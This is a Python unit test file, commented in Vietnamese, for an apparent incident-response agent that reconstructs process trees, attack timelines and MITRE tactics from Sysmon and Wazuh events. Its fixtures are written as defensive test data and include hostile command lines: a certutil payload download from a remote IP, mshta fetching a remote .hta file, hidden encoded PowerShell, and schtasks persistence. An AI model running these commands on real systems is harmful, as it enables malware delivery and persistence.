# -*- coding: utf-8 -*-
"""
tests/test_rca_agent.py
Bộ kiểm thử toàn diện cho Root Cause Analysis (RCA) Agent (SOC Tier 3 / DFIR Investigator).
Kiểm tra:
1. Phục dựng cây tiến trình đa tầng (Multi-level process hierarchy: WINWORD -> CMD -> PowerShell -> CertUtil).
2. Nhận diện chính xác is_malicious_origin tại tiến trình gốc bất thường (Patient Zero).
3. Nhận diện Initial Access Vector đối với các kịch bản thực tế (Phishing macro, Network Brute-force, Web Exploit, Drive-by).
4. Xây dựng Attack Timeline có thứ tự thời gian chuẩn xác (Chronological order).
5. Ánh xạ đúng chuỗi chiến thuật MITRE ATT&CK (Initial Access -> Execution -> Persistence -> Defense Evasion -> C2).
6. Kiểm tra analyze_state cập nhật đúng vào IncidentState và ghi nhận State Transition.
7. Xử lý an toàn các trường hợp biên (Empty events, missing PIDs).
8. Thực nghiệm trên dữ liệu cảnh báo thực tế (Mordor Scenario 2 Malware).
"""

import os
import unittest
from datetime import datetime, timezone, timedelta

from src.core.schemas import (
    ParsedEvent,
    ProcessNode,
    RootCauseAnalysis,
    ThreatIntelEnrichment,
    IoCItem,
    IncidentStatus,
)
from src.core.state import IncidentState
from src.agents.rca_agent import RCAAgent
from src.agents.ingestion_agent import IngestionAgent
from src.tools.wazuh_stream import WazuhAlertStreamer


class TestRCAAgent(unittest.TestCase):
    """Bộ kiểm thử đơn vị cho RCAAgent."""

    def setUp(self):
        self.agent = RCAAgent()
        self.base_time = datetime(2026, 10, 19, 10, 0, 0, tzinfo=timezone.utc)

    # =====================================================================
    # TEST 1: PHỤC DỰNG CÂY TIẾN TRÌNH ĐA TẦNG (MULTI-LEVEL HIERARCHY)
    # =====================================================================
    def test_multilevel_process_tree_reconstruction(self):
        """
        Kiểm tra phục dựng cây tiến trình 4 tầng:
        WINWORD.EXE (PID 1000) -> cmd.exe (PID 2000) -> powershell.exe (PID 3000) -> certutil.exe (PID 4000)
        """
        events = [
            # Event 1: cmd.exe sinh ra bởi WINWORD.EXE
            ParsedEvent(
                event_id="Sysmon-1",
                timestamp=self.base_time + timedelta(seconds=2),
                source_type="Sysmon",
                host_name="WIN10-VICTIM",
                process_name="cmd.exe",
                command_line="cmd.exe /c powershell.exe -enc SQBFAFgA...",
                parent_process="WINWORD.EXE",
                parent_command_line="C:\\Office\\WINWORD.EXE C:\\Users\\victim\\invoice.docm",
                raw_attributes={"process_id": "2000", "parent_process_id": "1000"},
            ),
            # Event 2: powershell.exe sinh ra bởi cmd.exe
            ParsedEvent(
                event_id="Sysmon-1",
                timestamp=self.base_time + timedelta(seconds=4),
                source_type="Sysmon",
                host_name="WIN10-VICTIM",
                process_name="powershell.exe",
                command_line="powershell.exe -enc SQBFAFgA...",
                parent_process="cmd.exe",
                raw_attributes={"process_id": "3000", "parent_process_id": "2000"},
            ),
            # Event 3: certutil.exe sinh ra bởi powershell.exe để tải payload
            ParsedEvent(
                event_id="Sysmon-1",
                timestamp=self.base_time + timedelta(seconds=6),
                source_type="Sysmon",
                host_name="WIN10-VICTIM",
                process_name="certutil.exe",
                command_line="certutil.exe -urlcache -split -f http://194.26.29.112/payload.exe payload.exe",
                parent_process="powershell.exe",
                raw_attributes={"process_id": "4000", "parent_process_id": "3000"},
            ),
        ]

        result = self.agent.analyze_events(events)

        self.assertIsInstance(result, RootCauseAnalysis)
        tree = result.process_tree

        # 1. Cây phải bao gồm đủ 4 tiến trình (tự động phát hiện cha gốc WINWORD.EXE)
        self.assertEqual(len(tree), 4)

        proc_names = [n.process_name for n in tree]
        self.assertIn("WINWORD.EXE", proc_names)
        self.assertIn("cmd.exe", proc_names)
        self.assertIn("powershell.exe", proc_names)
        self.assertIn("certutil.exe", proc_names)

        # 2. Kiểm tra liên kết quan hệ cha-con chính xác
        nodes_by_id = {n.process_id: n for n in tree}
        self.assertIn("1000", nodes_by_id)
        self.assertIn("2000", nodes_by_id)
        self.assertIn("3000", nodes_by_id)
        self.assertIn("4000", nodes_by_id)

        self.assertIsNone(nodes_by_id["1000"].parent_id)
        self.assertEqual(nodes_by_id["2000"].parent_id, "1000")
        self.assertEqual(nodes_by_id["3000"].parent_id, "2000")
        self.assertEqual(nodes_by_id["4000"].parent_id, "3000")

        # 3. Kiểm tra Patient Zero: WINWORD.EXE phải là tiến trình gốc phát tán mã độc
        self.assertTrue(nodes_by_id["1000"].is_malicious_origin)
        self.assertFalse(nodes_by_id["2000"].is_malicious_origin)
        self.assertFalse(nodes_by_id["3000"].is_malicious_origin)
        self.assertFalse(nodes_by_id["4000"].is_malicious_origin)

    # =====================================================================
    # TEST 2: NHẬN DIỆN PATIENT ZERO TRONG CÁC TÌNH HUỐNG HỆ THỐNG
    # =====================================================================
    def test_patient_zero_with_benign_system_parent(self):
        """
        Kiểm tra trường hợp tiến trình cha là tiến trình hệ thống hợp lệ (explorer.exe),
        thì tiến trình con đáng ngờ đầu tiên mới là Patient Zero (is_malicious_origin = True).
        """
        events = [
            ParsedEvent(
                event_id="Sysmon-1",
                timestamp=self.base_time,
                source_type="Sysmon",
                host_name="WIN10-VICTIM",
                process_name="powershell.exe",
                command_line="powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAA...",
                parent_process="explorer.exe",
                raw_attributes={"process_id": "4500", "parent_process_id": "1200"},
            ),
            ParsedEvent(
                event_id="Sysmon-1",
                timestamp=self.base_time + timedelta(seconds=3),
                source_type="Sysmon",
                host_name="WIN10-VICTIM",
                process_name="schtasks.exe",
                command_line="schtasks /create /tn Telemetry /tr C:\\Temp\\mal.exe /sc onlogon",
                parent_process="powershell.exe",
                raw_attributes={"process_id": "5200", "parent_process_id": "4500"},
            ),
        ]

        result = self.agent.analyze_events(events)
        nodes = {n.process_id: n for n in result.process_tree}

        # explorer.exe là tiến trình hệ thống bình thường, không phải gốc mã độc
        self.assertFalse(nodes["1200"].is_malicious_origin)
        # powershell.exe do explorer sinh ra phải được gán is_malicious_origin = True
        self.assertTrue(nodes["4500"].is_malicious_origin)
        # schtasks.exe là tiến trình con kế thừa
        self.assertFalse(nodes["5200"].is_malicious_origin)

    def test_patient_zero_web_server_exploit(self):
        """
        Kiểm tra trường hợp Web Server (w3wp.exe) bị khai thác sinh ra cmd.exe (Webshell/RCE).
        w3wp.exe phải được xác định là nguồn phát tán (Patient Zero).
        """
        events = [
            ParsedEvent(
                event_id="Sysmon-1",
                timestamp=self.base_time,
                source_type="Sysmon",
                host_name="WEB-SERVER-01",
                process_name="cmd.exe",
                command_line="cmd.exe /c whoami",
                parent_process="w3wp.exe",
                raw_attributes={
                    "process_id": "3100",
                    "parent_process_id": "1800",
                    "wazuh_rule_description": "Web shell command execution from IIS worker process",
                },
            )
        ]

        result = self.agent.analyze_events(events)
        nodes = {n.process_id: n for n in result.process_tree}

        self.assertTrue(nodes["1800"].is_malicious_origin)
        self.assertFalse(nodes["3100"].is_malicious_origin)
        self.assertIn("Exploit Public-Facing Application", result.initial_access_vector)

    # =====================================================================
    # TEST 3: NHẬN DIỆN INITIAL ACCESS VECTOR
    # =====================================================================
    def test_initial_access_vector_spearphishing_macro(self):
        """Kiểm tra nhận diện Spearphishing Attachment từ tài liệu văn phòng Office."""
        events = [
            ParsedEvent(
                event_id="Sysmon-1",
                timestamp=self.base_time,
                source_type="Sysmon",
                process_name="powershell.exe",
                command_line="powershell.exe -ExecutionPolicy Bypass",
                parent_process="excel.exe",
                parent_command_line="excel.exe C:\\Users\\finance\\payroll_october.xlsm",
            )
        ]
        result = self.agent.analyze_events(events)
        self.assertIn("Spearphishing Attachment", result.initial_access_vector)
        self.assertIn("Office Macro", result.initial_access_vector)
        self.assertEqual(result.confirmed_attack_type, "Endpoint Malware & C2 Reverse Shell")

    def test_initial_access_vector_network_brute_force(self):
        """Kiểm tra nhận diện External Remote Services từ các cảnh báo dò quét và brute-force đăng nhập."""
        events = [
            ParsedEvent(
                event_id="EVTX-4625",
                timestamp=self.base_time,
                source_type="WindowsSecurity",
                source_ip="185.220.101.5",
                user_name="administrator",
                raw_attributes={
                    "wazuh_rule_id": "60105",
                    "wazuh_rule_description": "Multiple failed logins for domain account (Brute Force / Password Spraying)",
                    "wazuh_groups": ["windows", "authentication_failed"],
                },
            ),
            ParsedEvent(
                event_id="EVTX-4624",
                timestamp=self.base_time + timedelta(seconds=30),
                source_type="WindowsSecurity",
                source_ip="185.220.101.5",
                user_name="administrator",
                raw_attributes={
                    "wazuh_rule_id": "60106",
                    "wazuh_rule_description": "Windows logon success from unusual external IP address",
                    "wazuh_groups": ["windows", "authentication_success"],
                },
            ),
        ]
        result = self.agent.analyze_events(events)
        self.assertIn("External Remote Services", result.initial_access_vector)
        self.assertIn("Brute-Force", result.initial_access_vector)
        self.assertEqual(result.confirmed_attack_type, "Password Spraying & Credential Theft")

    def test_initial_access_vector_drive_by_compromise(self):
        """Kiểm tra nhận diện Drive-by Compromise khi trình duyệt tải và thực thi mã độc."""
        events = [
            ParsedEvent(
                event_id="Sysmon-1",
                timestamp=self.base_time,
                source_type="Sysmon",
                process_name="mshta.exe",
                command_line="mshta.exe http://malicious-domain.com/evil.hta",
                parent_process="chrome.exe",
                raw_attributes={"wazuh_rule_description": "Browser drive-by download execution"},
            )
        ]
        result = self.agent.analyze_events(events)
        self.assertIn("Drive-by Compromise", result.initial_access_vector)

    # =====================================================================
    # TEST 4: DÒNG THỜI GIAN TẤN CÔNG (ATTACK TIMELINE)
    # =====================================================================
    def test_attack_timeline_chronological_ordering(self):
        """
        Kiểm tra Dòng thời gian tấn công (Attack Timeline) được sắp xếp đúng
        trật tự thời gian tăng dần bất kể thứ tự nạp vào ban đầu.
        """
        # Nạp các sự kiện theo thứ tự lộn xộn
        evt_t3 = ParsedEvent(
            event_id="Sysmon-3",
            timestamp=self.base_time + timedelta(seconds=45),
            source_type="Sysmon",
            process_name="powershell.exe",
            dest_ip="194.26.29.112",
            dest_port=443,
        )
        evt_t1 = ParsedEvent(
            event_id="Sysmon-1",
            timestamp=self.base_time + timedelta(seconds=10),
            source_type="Sysmon",
            process_name="WINWORD.EXE",
            command_line="WINWORD.EXE invoice.docm",
        )
        evt_t2 = ParsedEvent(
            event_id="Sysmon-1",
            timestamp=self.base_time + timedelta(seconds=20),
            source_type="Sysmon",
            process_name="powershell.exe",
            command_line="powershell.exe -enc ...",
            parent_process="WINWORD.EXE",
        )
        evt_t4 = ParsedEvent(
            event_id="Sysmon-11",
            timestamp=self.base_time + timedelta(seconds=60),
            source_type="Sysmon",
            process_name="powershell.exe",
            raw_attributes={"targetFilename": "C:\\Temp\\payload.exe"},
        )

        unorderd_events = [evt_t3, evt_t1, evt_t4, evt_t2]
        result = self.agent.analyze_events(unorderd_events)

        timeline = result.attack_timeline
        self.assertEqual(len(timeline), 4)

        # Mốc 1: WINWORD.EXE (10:00:10)
        self.assertIn("10:00:10", timeline[0])
        self.assertIn("WINWORD.EXE", timeline[0])

        # Mốc 2: powershell.exe (10:00:20)
        self.assertIn("10:00:20", timeline[1])
        self.assertIn("powershell.exe", timeline[1])

        # Mốc 3: Network Connect (10:00:45)
        self.assertIn("10:00:45", timeline[2])
        self.assertIn("194.26.29.112:443", timeline[2])

        # Mốc 4: File Creation (10:01:00)
        self.assertIn("10:01:00", timeline[3])
        self.assertIn("payload.exe", timeline[3])

    # =====================================================================
    # TEST 5: ÁNH XẠ CHUỖI CHIẾN THUẬT MITRE ATT&CK
    # =====================================================================
    def test_mitre_tactics_chain_mapping(self):
        """
        Kiểm tra suy luận đầy đủ chuỗi chiến thuật MITRE ATT&CK theo đúng thứ tự vòng đời:
        Initial Access -> Execution -> Persistence -> Defense Evasion -> Command and Control
        """
        events = [
            ParsedEvent(
                event_id="Sysmon-1",
                timestamp=self.base_time,
                source_type="Sysmon",
                process_name="cmd.exe",
                command_line="cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgA...",
                parent_process="WINWORD.EXE",
            ),
            ParsedEvent(
                event_id="Sysmon-1",
                timestamp=self.base_time + timedelta(seconds=5),
                source_type="Sysmon",
                process_name="schtasks.exe",
                command_line="schtasks /create /tn WindowsUpdate /tr payload.exe /sc onlogon",
                parent_process="powershell.exe",
            ),
            ParsedEvent(
                event_id="Sysmon-3",
                timestamp=self.base_time + timedelta(seconds=10),
                source_type="Sysmon",
                process_name="powershell.exe",
                dest_ip="194.26.29.112",
                dest_port=443,
            ),
        ]

        result = self.agent.analyze_events(events)
        tactics = result.mitre_tactics

        # Đảm bảo các chiến thuật chính đều có mặt
        self.assertIn("Initial Access", tactics)
        self.assertIn("Execution", tactics)
        self.assertIn("Persistence", tactics)
        self.assertIn("Defense Evasion", tactics)
        self.assertIn("Command and Control", tactics)

        # Đảm bảo tuân thủ thứ tự tiêu chuẩn MITRE ATT&CK
        idx_initial = tactics.index("Initial Access")
        idx_exec = tactics.index("Execution")
        idx_persist = tactics.index("Persistence")
        idx_evasion = tactics.index("Defense Evasion")
        idx_c2 = tactics.index("Command and Control")

        self.assertLess(idx_initial, idx_exec)
        self.assertLess(idx_exec, idx_persist)
        self.assertLess(idx_persist, idx_evasion)
        self.assertLess(idx_evasion, idx_c2)

    # =====================================================================
    # TEST 6: TÍCH HỢP ANALYZE_STATE TRÊN INCIDENTSTATE
    # =====================================================================
    def test_analyze_state_integration(self):
        """
        Kiểm tra phương thức analyze_state:
        - Cập nhật rca_result vào IncidentState.
        - Ghi nhận state transition chuyển trạng thái đúng quy trình.
        """
        events = [
            ParsedEvent(
                event_id="Sysmon-1",
                timestamp=self.base_time,
                source_type="Sysmon",
                host_name="WIN10-VICTIM-01",
                process_name="powershell.exe",
                command_line="powershell.exe -enc SQBFAFgA...",
                parent_process="WINWORD.EXE",
                raw_attributes={"process_id": "4010", "parent_process_id": "3010"},
            )
        ]

        state = IncidentState(
            incident_id="INC-TEST-RCA-001",
            status=IncidentStatus.INVESTIGATING,
            parsed_events=events,
        )

        initial_history_len = len(state.history)
        updated_state = self.agent.analyze_state(state)

        # 1. Kết quả RCA phải được cập nhật
        self.assertIsNotNone(updated_state.rca_result)
        self.assertIsInstance(updated_state.rca_result, RootCauseAnalysis)
        self.assertEqual(len(updated_state.rca_result.process_tree), 2)
        self.assertEqual(updated_state.attack_type, "Endpoint Malware & C2 Reverse Shell")
        self.assertEqual(updated_state.rca_result.confirmed_attack_type, "Endpoint Malware & C2 Reverse Shell")
        self.assertIn("WIN10-VICTIM-01", updated_state.rca_result.attack_scope)

        # 2. Lịch sử chuyển dịch State Transition phải được ghi nhận
        self.assertEqual(len(updated_state.history), initial_history_len + 1)
        last_transition = updated_state.history[-1]
        self.assertEqual(last_transition.node, "rca")
        self.assertEqual(last_transition.to_status, IncidentStatus.INVESTIGATING)
        self.assertIn("patient_zero", last_transition.metadata)
        self.assertIn("WINWORD.EXE", last_transition.metadata["patient_zero"])

    # =====================================================================
    # TEST 7: XỬ LÝ SỰ KIỆN TRỐNG VÀ THIẾU PID TƯỜNG MINH
    # =====================================================================
    def test_empty_events_graceful_handling(self):
        """Kiểm tra xử lý danh sách sự kiện rỗng mà không gây crash exception."""
        result = self.agent.analyze_events([])
        self.assertEqual(result.process_tree, [])
        self.assertEqual(result.initial_access_vector, "Unknown / Insufficient Data")
        self.assertIn("Không đủ dữ liệu", result.root_cause_summary)

    def test_synthetic_pid_linking_without_raw_pids(self):
        """
        Kiểm tra khả năng tự động liên kết parent-child thông qua tên tiến trình
        khi log thô không cung cấp trường process_id/parent_process_id.
        """
        events = [
            ParsedEvent(
                event_id="Sysmon-1",
                timestamp=self.base_time,
                source_type="Sysmon",
                process_name="cmd.exe",
                command_line="cmd.exe /c calc.exe",
                parent_process="WINWORD.EXE",
            ),
            ParsedEvent(
                event_id="Sysmon-1",
                timestamp=self.base_time + timedelta(seconds=1),
                source_type="Sysmon",
                process_name="calc.exe",
                command_line="calc.exe",
                parent_process="cmd.exe",
            ),
        ]

        result = self.agent.analyze_events(events)
        tree = result.process_tree
        self.assertEqual(len(tree), 3)

        name_to_node = {n.process_name: n for n in tree}
        winword = name_to_node["WINWORD.EXE"]
        cmd = name_to_node["cmd.exe"]
        calc = name_to_node["calc.exe"]

        self.assertEqual(cmd.parent_id, winword.process_id)
        self.assertEqual(calc.parent_id, cmd.process_id)
        self.assertTrue(winword.is_malicious_origin)

    # =====================================================================
    # TEST 8: THỰC NGHIỆM TRÊN BỘ DỮ LIỆU CẢNH BÁO SCENARIO 2 (MALWARE REPLAY)
    # =====================================================================
    def test_replay_mordor_scenario2_malware(self):
        """
        Replay kịch bản thực tế Scenario 2 (Malware với 4 alerts Wazuh/Sysmon):
        - Alert 1: Sysmon Event 1 (powershell.exe encoded command từ WINWORD.EXE)
        - Alert 2: Sysmon Event 11 (File creation: invoice_scan_v8.exe trong Temp)
        - Alert 3: Sysmon Event 3 (Network connect tới 194.26.29.112:443)
        - Alert 4: Sysmon Event 1 (Persistence qua schtasks.exe)
        """
        data_path = os.path.join(
            os.path.dirname(__file__), "..", "data", "raw", "wazuh", "wazuh_alerts_scenario2_malware.json"
        )
        if not os.path.exists(data_path):
            self.skipTest(f"Data file không tồn tại: {data_path}")

        streamer = WazuhAlertStreamer.from_file(data_path)
        alerts = streamer.get_all_alerts()
        ingestion = IngestionAgent()

        state = ingestion.create_incident_state(alerts)
        self.assertEqual(len(state.parsed_events), 4)

        # Chạy phân tích RCA
        state = self.agent.analyze_state(state)
        rca = state.rca_result

        self.assertIsNotNone(rca)
        # 1. Initial Access Vector phải nhận diện Phishing Macro
        self.assertIn("Spearphishing Attachment", rca.initial_access_vector)

        # 2. Process Tree phải có WINWORD.EXE, powershell.exe, schtasks.exe
        proc_names = [n.process_name for n in rca.process_tree]
        self.assertIn("WINWORD.EXE", proc_names)
        self.assertIn("powershell.exe", proc_names)
        self.assertIn("schtasks.exe", proc_names)

        # 3. Patient Zero phải là WINWORD.EXE
        patient_zero = next(n for n in rca.process_tree if n.is_malicious_origin)
        self.assertEqual(patient_zero.process_name, "WINWORD.EXE")

        # 4. Timeline phải chứa các mốc quan trọng
        timeline_str = " ".join(rca.attack_timeline)
        self.assertIn("powershell.exe", timeline_str)
        self.assertIn("invoice_scan_v8.exe", timeline_str)
        self.assertIn("194.26.29.112:443", timeline_str)
        self.assertIn("schtasks.exe", timeline_str)

        # 5. MITRE ATT&CK Tactics đầy đủ
        self.assertIn("Initial Access", rca.mitre_tactics)
        self.assertIn("Execution", rca.mitre_tactics)
        self.assertIn("Persistence", rca.mitre_tactics)
        self.assertIn("Defense Evasion", rca.mitre_tactics)
        self.assertIn("Command and Control", rca.mitre_tactics)


if __name__ == "__main__":
    unittest.main()
